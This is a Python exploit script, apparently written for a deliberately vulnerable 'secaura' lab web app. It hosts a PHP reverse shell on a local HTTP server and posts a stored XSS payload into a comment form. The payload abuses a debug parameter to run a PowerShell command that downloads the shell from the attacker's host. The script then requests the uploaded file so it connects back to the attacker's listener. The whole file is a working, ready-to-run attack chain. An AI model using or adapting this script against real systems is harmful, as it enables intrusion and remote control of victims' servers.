#!/usr/bin/env python3

import http.server
import socketserver
import threading
import requests
import argparse
from urllib.parse import urljoin
import time

def revShell(target, lhost):
    """
    Serve revshell.php on port 80 until it is fetched (HTTP 200),
    then trigger http://<target>/secaura/revshell.php
    """
    print("[*] Ensure `revshell.php` is in the same directory as this script")

    # Event to signal the file was fetched
    fetched_event = threading.Event()

    class Handler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            # Optional: quiet the default logging
            print(f"[*] {self.address_string()} requested {self.path}")
        def do_GET(self):
            super().do_GET()
            # Check if the requested file is revshell.php
            if self.path.endswith("revshell.php"):
                fetched_event.set()

    def serve():
        with socketserver.TCPServer(("", 80), Handler) as httpd:
            print("[*] HTTP server listening on port 80…")
            while not fetched_event.is_set():
                httpd.handle_request()

    # Start HTTP server in a thread
    t = threading.Thread(target=serve, daemon=True)
    t.start()

    # Send XSS payload to make victim download revshell.php
    url = urljoin(target, "/secaura/")
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    xss_payload = f"\"><script src=http://localhost/secaura/upload.php?debugcommandLineParameter=powershell%20-c%20invoke-webrequest%20-Uri%20http://{lhost}/revshell.php%20-OutFile%20revshell.php&debugcommandSecret=Subscribe2SecAura:)></script>"
    data = {"comment": xss_payload, "name": "Reverse Shell"}
    requests.post(url, headers=headers, data=data)
    print("[*] XSS payload sent, waiting for victim to fetch revshell.php…")

    # Block until the victim downloads the file
    fetched_event.wait()
    print("[*] revshell.php fetched, shutting down HTTP server.")

    # Trigger the uploaded reverse shell on the target
    target_php = urljoin(target, "/secaura/revshell.php")
    print(f"[*] Triggering reverse shell at {target_php}")
    time.sleep(3)
    try:
        print(f"[+] Reverse Shell URL: {target_php}")
        print("[+] Check your listener")
        r = requests.get(target_php)
        print(f"[*] Trigger request status: {r.status_code}")
    except Exception as e:
        print(f"[!] Error triggering shell: {e}")


def main():
    parser = argparse.ArgumentParser(description="Serve and trigger a PHP reverse shell via XSS.")
    parser.add_argument("target", help="Target base URL (e.g. http://192.168.1.7)")
    parser.add_argument("lhost", help="Your listener IP that the victim will connect back to")
    args = parser.parse_args()
    revShell(args.target, args.lhost)

if __name__ == "__main__":
    main()
